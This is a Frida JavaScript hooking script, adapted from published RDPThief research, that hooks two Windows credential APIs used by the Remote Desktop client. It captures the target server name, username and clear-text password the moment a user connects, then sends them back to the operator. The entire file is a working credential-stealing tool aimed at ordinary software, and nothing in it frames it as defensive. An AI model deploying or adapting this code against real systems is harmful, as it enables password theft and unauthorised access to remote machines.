//--------------------------------------------------------------------------------------------------------------//
//                          RDP credential theft, adapted from research by @0x09AL                              //
// URL: https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/ //
//--------------------------------------------------------------------------------------------------------------//

// Native function pointer
var pSspiPrepareForCredRead = Module.findExportByName("SspiCli.dll", 'SspiPrepareForCredRead')
var pCredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", 'CredUnPackAuthenticationBufferW')

// Globals
var sTargetHost;

// This function is called any time the target is updated and when clicking
// on connect. We are only interested in the last value that was set before
// calling Credui!CredUnPackAuthenticationBufferW.
// => https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-sspiprepareforcredread
Interceptor.attach(pSspiPrepareForCredRead, {
    onEnter: function (args) {
        // Update global when the function is called
        sTargetHost = args[1].readUtf16String();
    }
});

// This function is only called when the user finally tries to initiate the
// connection to the server.
// => https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credunpackauthenticationbufferw
Interceptor.attach(pCredUnPackAuthenticationBufferW, {
    onEnter: function (args) {
        // Save ptr's to poll data in onLeave
        this.pszUserName = args[3];
        this.pszPassword = args[7];
    },

    onLeave: function (retval) {
        send("|-------");
        send("| Server : " + sTargetHost);
        send("| User   : " + this.pszUserName.readUtf16String());
        send("| Pass   : " + this.pszPassword.readUtf16String());
        send("|-------");
    }
});